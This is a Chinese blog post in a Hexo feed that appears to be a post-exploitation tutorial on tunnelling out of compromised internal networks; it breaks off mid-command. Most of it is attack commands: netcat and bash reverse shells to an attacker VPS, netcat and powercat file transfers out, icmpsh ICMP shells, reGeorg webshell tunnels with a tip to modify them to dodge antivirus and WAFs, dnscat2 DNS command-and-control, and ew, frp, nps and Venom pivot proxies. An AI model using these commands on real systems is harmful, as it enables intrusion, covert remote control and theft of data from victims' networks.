bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>内网安全学习从入门到入狱-知识-内网隧道技术小结</title>
      <link href="/2020/05/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%B0%8F%E7%BB%93/"/>
      <url>/2020/05/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>@[TOC]</p><h1 id="0x00-内网穿透技术"><a href="#0x00-内网穿透技术" class="headerlink" title="0x00 内网穿透技术"></a>0x00 内网穿透技术</h1><p>当我们拿到一台内网主机后，一般都是有区域隔离的。</p><p>所以内网隧道技术，就是我们必须要掌握的。</p><p>我简单介绍一下建立通信隧道，常见的有端口转发等</p><p>主要隧道有：</p><p>ICMP TCP UDP</p><p>SSH HTTP DNS</p><p>SOCKS</p><h1 id="0x01-首先判断出网协议"><a href="#0x01-首先判断出网协议" class="headerlink" title="0x01 首先判断出网协议"></a>0x01 首先判断出网协议</h1><p>icmp协议：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping 命令</span><br><span class="line">ping www.baidu.com</span><br></pre></td></tr></table></figure><p>TCP协议：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl www.baidu.com</span><br><span class="line">nc IP</span><br></pre></td></tr></table></figure><p>HTTP协议：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl ip:port</span><br><span class="line">curl www.baidu.com:80</span><br></pre></td></tr></table></figure><p>DNS协议：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Nslookup www.baidu.com</span><br><span class="line">Dig www.baidu.com</span><br></pre></td></tr></table></figure><h1 id="0x02-各种协议隧道"><a href="#0x02-各种协议隧道" class="headerlink" title="0x02 各种协议隧道"></a>0x02 各种协议隧道</h1><h1 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h1><h2 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h2><p>ICMP（Internet Control Message Protocol）：没有目的端口与源端口，属于Internet控制报文协议。它是TCP/IP协议簇的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。</p><p>icmp隧道常用攻击：icmpsh、PRISM</p><p>icmpsh<br>环境说明:跨平台、不需要管理员运行</p><p>有三台机器： VPS–边界机–内网机</p><p>VPS操作过程：</p><p>下载icmpsh</p><p>安装依赖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">服务端禁用：</span><br><span class="line">icmp respones  sysctl -w net.ipv4.icmp_echo_ignore_all&#x3D;1</span><br><span class="line"></span><br><span class="line">运行程序 ：</span><br><span class="line">.&#x2F;run.sh</span><br><span class="line"></span><br><span class="line">输入目标主机IP地址 开启监听：</span><br><span class="line">.&#x2F;icmpsh_m,py  vpsip 边界出网的公网IP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在边界机执行：</span><br><span class="line">Imp.exe -t 攻击机ip -d 500 -b 30 -s 128</span><br></pre></td></tr></table></figure><p>还有一种方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">编译 gcc icmpsh-m.c</span><br><span class="line"></span><br><span class="line">VPS开启监听： sudo .&#x2F;a.out</span><br><span class="line"></span><br><span class="line">内网边界主机：icmpsh.exe -t VPSip -d 500 -b 30 -s 128</span><br></pre></td></tr></table></figure><h2 id="Lcx"><a href="#Lcx" class="headerlink" title="Lcx"></a>Lcx</h2><p>内网端口转发 </p><p>老工具了也是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">目标主机：</span><br><span class="line"></span><br><span class="line">lcx.exe -slave vpsip 4444 127.0.0.1 3389</span><br><span class="line"></span><br><span class="line">VPS:</span><br><span class="line"></span><br><span class="line">Lcx --listen 4444 5555</span><br></pre></td></tr></table></figure><h1 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h1><h2 id="瑞士军刀：nc"><a href="#瑞士军刀：nc" class="headerlink" title="瑞士军刀：nc"></a>瑞士军刀：nc</h2><p>nc 是一款比较老的工具，但是确实是经典俗称瑞士军刀，简单介绍一下</p><p>简单互相传输功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vps：</span><br><span class="line"></span><br><span class="line">nc -lp 5555 </span><br><span class="line"></span><br><span class="line">目标机器：</span><br><span class="line"></span><br><span class="line">Nc -vn vpsip 5555</span><br></pre></td></tr></table></figure><p>文件传输功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vps：</span><br><span class="line"></span><br><span class="line">nc -lp 5555 &gt;1.txt</span><br><span class="line"></span><br><span class="line">目标机器：</span><br><span class="line"></span><br><span class="line">Nc -vn vpsip &lt; xx.txt</span><br></pre></td></tr></table></figure><p>shell的反弹：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">正向连接：</span><br><span class="line"></span><br><span class="line">nc -lvp 4444 -e &#x2F;bin&#x2F;sh</span><br><span class="line"></span><br><span class="line">nc  192.168.1.1 4444</span><br><span class="line"></span><br><span class="line">反向连接：</span><br><span class="line"></span><br><span class="line">nc -lvp 4444</span><br><span class="line"></span><br><span class="line">nc 192.168.1.1 4444 -e &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p>注意：windows版本CMD位置</p><p>C:\windows\system32\cmd.exe</p><p>Bash反向shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br><span class="line"></span><br><span class="line">Bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.1&#x2F;4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h2 id="Powercat（powershell版的nc）"><a href="#Powercat（powershell版的nc）" class="headerlink" title="Powercat（powershell版的nc）"></a>Powercat（powershell版的nc）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">正向和反向连接：</span><br><span class="line"></span><br><span class="line">powercat -l -p 8080 -e cmd.exe  -v   </span><br><span class="line">nc 192.168.1.1 8080 -vv</span><br><span class="line"></span><br><span class="line">nc -l -p 8080 -vv</span><br><span class="line">powercat -c 192.169.1.1 -p 8080 -e cmd.exe -v</span><br></pre></td></tr></table></figure><p>可以反弹powershell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-eq</span><br></pre></td></tr></table></figure><p><strong>文件上传</strong></p><p>这个不用说，基本这种连接的都支持</p><p>在<code>c:</code>下新建一个<code>test.txt</code>的文件，写入数据</p><p>在有<code>text.txt</code>的机器执行:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -c 192.168.12.108 -p 9999 -i c:test.txt -v</span><br></pre></td></tr></table></figure><p>另一台机器执行</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -p 9999 -of c:test.txt -v</span><br></pre></td></tr></table></figure><h2 id="推荐：netsh端口转发（window平台）"><a href="#推荐：netsh端口转发（window平台）" class="headerlink" title="推荐：netsh端口转发（window平台）"></a>推荐：netsh端口转发（window平台）</h2><p>netsh仅支持TCP协议， 适用于<strong>双网卡</strong>服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">查看系统防火墙状态</span><br><span class="line">netsh firewall show state   </span><br><span class="line"></span><br><span class="line">查看现有规则</span><br><span class="line">netsh interface portproxy show all   </span><br><span class="line"></span><br><span class="line">添加转发规则</span><br><span class="line">listenaddress – 等待连接的本地IP地址</span><br><span class="line">listenport – 本地侦听TCP端口</span><br><span class="line">connectaddress – 将传入连接重定向到本地或远程IP地址（或DNS名称）</span><br><span class="line"></span><br><span class="line">netsh interface portproxy set v4tov4 listenaddress&#x3D;边界机 listenport&#x3D;6666 connectaddress&#x3D;内网IP connectport&#x3D;3389</span><br><span class="line"></span><br><span class="line">#连接边界机6666端口，就是连接到内网目标上面的3389</span><br><span class="line"></span><br><span class="line">使用netstat确保6666端口当前处于被侦听状态：</span><br><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line">删除转发规则</span><br><span class="line">netsh interface portproxy delete v4tov4 listenport&#x3D;6666</span><br></pre></td></tr></table></figure><h1 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h1><h2 id="SSH转发："><a href="#SSH转发：" class="headerlink" title="SSH转发："></a>SSH转发：</h2><p>一个正常的SSH命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.1.1</span><br></pre></td></tr></table></figure><h2 id="SSH-本地转发机制："><a href="#SSH-本地转发机制：" class="headerlink" title="SSH 本地转发机制："></a>SSH 本地转发机制：</h2><p>拓扑：</p><p>VPS—-边界WEB—-目标主机</p><p>边界WEB双网卡192.168.1.1和10.1.1.1段</p><p>本地转发机制：</p><p>选项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-C 压缩传输</span><br><span class="line">-f 后台启用</span><br><span class="line">-N 不打开远程shell，处于等待状态</span><br><span class="line">-g 允许本地转发端口</span><br></pre></td></tr></table></figure><p>使用方法：</p><p><strong>在VPS上运行</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L &lt;vps port&gt;:&lt;目标主机 host&gt;:&lt;目标主机 port&gt; &lt;SSH 边界机&gt;</span><br><span class="line"></span><br><span class="line">ssh  -CfNg -l 5555:10.1.1.1:3389 root@192.168.1.1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#VPS检查---查看端口是否已经连接</span><br><span class="line">netstat -tulnp | grep &quot;5555&quot;</span><br></pre></td></tr></table></figure><p>当访问 VPS 5555 端口的时候，就转发给 <a href="mailto:root@192.168.1.1">root@192.168.1.1</a> 边界机 ，发送给目标主机</p><h2 id="SSH-远程转发机制："><a href="#SSH-远程转发机制：" class="headerlink" title="SSH 远程转发机制："></a>SSH 远程转发机制：</h2><p>拓扑：</p><p>VPS—-边界WEB—-目标主机</p><p>边界WEB—-目标主机—都是单网卡，都是纯内网 10.1.1.1段</p><p><strong>在WEB边界机运行</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -R &lt;vps port&gt;:&lt;目标主机 host&gt;:&lt;目标主机 port&gt; &lt;SSH VPS主机&gt;</span><br><span class="line"></span><br><span class="line">ssh  -CfNg -l 6666:10.1.1.1:3389 root@49.121.1.102</span><br></pre></td></tr></table></figure><p>边界机把内网的端口，远程连接道VPS，远程转发道VPS</p><h2 id="SSH-动态转发机制："><a href="#SSH-动态转发机制：" class="headerlink" title="SSH 动态转发机制："></a>SSH 动态转发机制：</h2><p>这里主要是建立一个动态的socks代理隧道</p><p>在VPS上运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -D 7000 &lt;SSH 边界主机&gt;</span><br><span class="line">ssh -CfNg -D 7000 root@192.168.1.1</span><br></pre></td></tr></table></figure><p>VPS上7000端口上，开了一个socks代理，用代理软件就可以连接</p><h2 id="HTTP-HTTPS协议隧道"><a href="#HTTP-HTTPS协议隧道" class="headerlink" title="HTTP HTTPS协议隧道"></a>HTTP HTTPS协议隧道</h2><ol><li>reGeorg：</li></ol><p>将对应的脚本文件上传到目标服务器，根据不同的网站类型php    jsp    asp等，上传对应的脚本 reGeorg.php</p><p>攻击机(VPS)运行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -l 46.46.46.46（VPS的IP） -p 666（VPS端口） -u http:&#x2F;&#x2F;（目标服务器IP）&#x2F;reGeorg.php</span><br></pre></td></tr></table></figure><p>然后在本地通过代理工具链接本地的666，就是链接好隧道了</p><p>注意：这个查杀比较严重，建议会免杀的修改修改。</p><p> 非常遗憾的是，目前大部分<code>WAF</code>都会针对默认原装版本的<code>reGeorg</code> 。（可以自己修改后使用）</p><p>2.Neo-reGeorg </p><p>这里推荐用 Neo-reGeorg 这个也不错，是重构reGeorg 的一个作品</p><p><a href="https://github.com/L-codes/Neo-reGeorg" target="_blank" rel="noopener">https://github.com/L-codes/Neo-reGeorg</a></p><p>用法类似：</p><p>VPS上支持生成的服务端，默认 GET 请求响应指定的页面内容 (如伪装的404页面)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python neoreg.py generate -k &lt;you_password&gt; --file 404.html</span><br></pre></td></tr></table></figure><p>将相应的隧道文件放到目标服务器的web目录后使用neoreg连接web服务器并建立本地socks代理。</p><p>VPS上运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python neoreg.py -k &lt;you_password&gt; -u &lt;server_url&gt; --proxy socks5:&#x2F;&#x2F;10.1.1.1:8080（本地代理地址）</span><br></pre></td></tr></table></figure><p>Socks连接工具连接本地127.0.0.1:1080</p><h2 id="DNS-隧道："><a href="#DNS-隧道：" class="headerlink" title="DNS 隧道："></a>DNS 隧道：</h2><p>dnscat2</p><p>工具dnscat2，这是一DNS隧道，该工具旨在通过DNS协议创建加密的命令和控制（C＆C）通道，还有自己的控制台</p><p>dnscat2分为两个部分：客户端和服务器。</p><p>服务端为<code>Ruby</code>编写，需安装Ruby环境。kali系统内置Ruby，但是运行时仍可能报缺少一些gem依赖：</p><p>服务端VPS：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">安装依赖：</span><br><span class="line">apt install gem</span><br><span class="line">apt install ruby-dev</span><br><span class="line">apt install libpq-dev</span><br><span class="line">apt install ruby-bundler</span><br><span class="line"></span><br><span class="line">下载并安装：</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;iagox86&#x2F;dnscat2.git</span><br><span class="line">cd dnscat2&#x2F;server</span><br><span class="line">sudo gem install bundler</span><br><span class="line"></span><br><span class="line">开启服务：</span><br><span class="line">ruby .&#x2F;dnscat2.rb vpn.zeo.com -e open</span><br></pre></td></tr></table></figure><p>目标主机客户端：</p><p>上传dnsClient.zip 到目标主机 解压</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;dnscat --dns server&#x3D;服务端ip,port&#x3D;53 --secret&#x3D;服务端生成的秘钥</span><br></pre></td></tr></table></figure><p>直连模式使用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">VPS中 server路径下：</span><br><span class="line">ruby .&#x2F;dnscat2</span><br><span class="line"></span><br><span class="line">客户端：（这个命令会在 上面服务启动后提示，可以参考下面的截图红框）</span><br><span class="line">.&#x2F;dnscat --dns server&#x3D;x.x.x.x,port&#x3D;53 --secret&#x3D;281fc7a7ec57d500d269c96b8ae36ba5</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/202005061043407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">常用命令： </span><br><span class="line">window -i 1 进入交互 </span><br><span class="line">exec -c &quot;ping baidu.com&quot; 执行命令， 无回显 </span><br><span class="line">shell 返回一个半交互shell,会有一个id，记录此id </span><br><span class="line">ctrl+Z 返回</span><br></pre></td></tr></table></figure><h2 id="Socks代理："><a href="#Socks代理：" class="headerlink" title="Socks代理："></a>Socks代理：</h2><p>下面基本上都是可以支持多种协议，之介绍scoks的情况，大家可以自己查看使用方法</p><p>也推荐使用这些工具</p><p><strong>nps：</strong> <a href="https://github.com/ehang-io/nps" target="_blank" rel="noopener">https://github.com/ehang-io/nps</a> </p><p><strong>ew：</strong><a href="https://github.com/idlefire/ew" target="_blank" rel="noopener">https://github.com/idlefire/ew</a></p><p><strong>frp：</strong> <a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">https://github.com/fatedier/frp</a> </p><h2 id="推荐使用"><a href="#推荐使用" class="headerlink" title="推荐使用"></a>推荐使用</h2><h2 id="Nps"><a href="#Nps" class="headerlink" title="Nps"></a>Nps</h2><p>nps是一款轻量级、高性能、功能强大的<strong>内网穿透</strong>代理服务器。</p><p> (<a href="https://github.com/ehang-io/nps" target="_blank" rel="noopener">https://github.com/ehang-io/nps</a>)</p><p>优点：</p><ul><li>协议支持全面，兼容几乎所有常用协议，例如tcp、udp、http(s)、socks5、p2p、http代理…</li><li>全平台兼容(linux、windows、macos、群辉等)，支持一键安装为系统服务</li><li>操作简单，只需简单的配置即可在web ui上完成其余操作</li><li>展示信息全面，流量、系统信息、即时带宽、客户端版本等</li><li>扩展功能强大，该有的都有了（缓存、压缩、加密、流量限制、带宽限制、端口复用等等）</li></ul><p>环境说明: </p><p>kali边界机: 192.168.5.123 192.168.3.2<br>kali2: 192.168.5.128 攻击者vps机器<br>win7:192.168.3.99 内网机器 </p><p>1 启动服务端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim .&#x2F;conf&#x2F;nps.conf</span><br><span class="line">cd ..</span><br><span class="line">.&#x2F;nps. #启动服务</span><br></pre></td></tr></table></figure><p>在服务端配置conf/nps.conf文件，修改用户名密码，端口号后启动服务,最好不要和已有的端口冲突</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">默认端口</span><br><span class="line">nps默认配置文件使用了80，443，8080，8024端口</span><br><span class="line"></span><br><span class="line">80与443端口为域名解析模式默认端口</span><br><span class="line"></span><br><span class="line">8080为web管理访问端口</span><br><span class="line"></span><br><span class="line">8024为网桥端口，用于客户端与服务器通信</span><br><span class="line"></span><br><span class="line">以上都可以在服务端配置conf&#x2F;nps.conf 自行修改</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200506104408292.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p><p>直接访问自己设计的web端口 <a href="http://IP:8081/login/index" target="_blank" rel="noopener">http://IP:8081/login/index</a></p><p>友好的操作界面！</p><p><img src="https://img-blog.csdnimg.cn/20200506104440491.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2 新增一个客户端，在配置中填写socks代理的密码</p><p><img src="https://img-blog.csdnimg.cn/20200506104524136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>3 记住唯一验证密钥和ID，连接使用</p><p><img src="https://img-blog.csdnimg.cn/20200506104547485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>4 客户端连接，上传npc到边界机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npc.exe -server&#x3D;服务端ip:8024 -vkey&#x3D;生成的vkey -type&#x3D;tcp</span><br></pre></td></tr></table></figure><p>成功上线，点击隧道配置代理</p><p><img src="https://img-blog.csdnimg.cn/20200506104606195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>新建隧道，协议很全</p><p><img src="https://img-blog.csdnimg.cn/20200506104619902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="\[(img-KVfWBLv0-1588732919232)(/Users/zy/Documents/文档文件/学习笔记/内网/内网隧道技术.assets/image-20200430111407478.png)\]"><br>这个界面十分友好，就不继续介绍，基本看一眼就会用了。</p><h2 id="ew"><a href="#ew" class="headerlink" title="ew"></a>ew</h2><p> EarthWorm是一款用于开启 SOCKS v5 代理服务的工具，可以用于多层的内网穿透</p><p>多层内网穿透可以去GitHub查找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">VPS开启监听：</span><br><span class="line">.&#x2F;ew_for_linux64 -s rcsocks -l 1080 -e 1024</span><br><span class="line"></span><br><span class="line">边界机执行：</span><br><span class="line">ew_for_Win.exe -s rssocks -d 攻击Ip -e 1024</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200506104758900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>多层内网二层网络，A无外网 IP–vps 流量转发 +B 正向代理 +A作为跳板端口绑定</p><p>VPS–边界机（可以出网）–内网机（目标网络内部主机，无法访问公网）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">VPS:</span><br><span class="line">.&#x2F;ew -s lcx_listen -l 1080 -e 8888</span><br><span class="line">边界机器:</span><br><span class="line">ew -s lcx_slave -d VPS_IP -e 666 -f 内网主机 -g 9999</span><br><span class="line">内网:</span><br><span class="line">ew -s sscoksd -l 9999</span><br></pre></td></tr></table></figure><p>VPS将1080的代理请求转发到8888</p><p>在边界机上，通过工具的 lcx_slave 方式，打通VPS:8888 和 内网机:9999 之间的通讯隧道</p><p>在内网主机上利用 ssocksd 方式启动 9999 代理</p><p>我们是可通过访问VPS:1080 来使用内网主机提供的 socks5 代理</p><h2 id="Frp"><a href="#Frp" class="headerlink" title="Frp"></a>Frp</h2><ul><li>frp 是一个可用于内网穿透的高性能的反向代理应用</li><li>支持 tcp, udp 协议，为 http 和 https </li></ul><p>将 <strong>frps</strong> 及 <strong>frps.ini</strong> 放到具有公网 IP 的机器上。</p><p>将 <strong>frpc</strong> 及 <strong>frpc.ini</strong> 放到处于内网环境的机器上。</p><p>首先在vps上启动frp服务端,开启一个端口，默认是7000：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;frps -c frps.ini</span><br></pre></td></tr></table></figure><p>再配置frp的客户端： </p><ol><li>修改 frpc.ini 文件，假设 frps 所在服务器的公网 IP 为 x.x.x.x：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; x.x.x.x</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line"></span><br><span class="line">[socks5] </span><br><span class="line">type &#x3D; tcp </span><br><span class="line">remote_port &#x3D; 8881 </span><br><span class="line">plugin &#x3D; socks5 </span><br><span class="line">plugin_user &#x3D; root </span><br><span class="line">plugin_passwd &#x3D; root </span><br><span class="line">use_encryption &#x3D; true </span><br><span class="line">use_compression &#x3D; true</span><br></pre></td></tr></table></figure><p>注意：上面的配置了用户名密码 root root 代理的时候注意要加上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">最后两个配置是</span><br><span class="line">use_encryption &#x3D; true \\启用加密</span><br><span class="line">use_compression &#x3D; true  \\启用压缩</span><br></pre></td></tr></table></figure><p>启动 frpc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frpc.exe -c .&#x2F;frpc.ini</span><br></pre></td></tr></table></figure><p>最后，使用代理软件连接服务端的8881建立连接</p><h2 id="Venom"><a href="#Venom" class="headerlink" title="Venom"></a>Venom</h2><p>Venom是一款为渗透测试人员设计的使用Go开发的多级代理工具</p><p>admin节点和agent节点均可监听连接也可发起连接,可以互相的连接。</p><p>admin监听端口，agent发起连接:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;admin_linux_x64 -lport 8838</span><br><span class="line"></span><br><span class="line">agent.exe -rhost VPS_IP 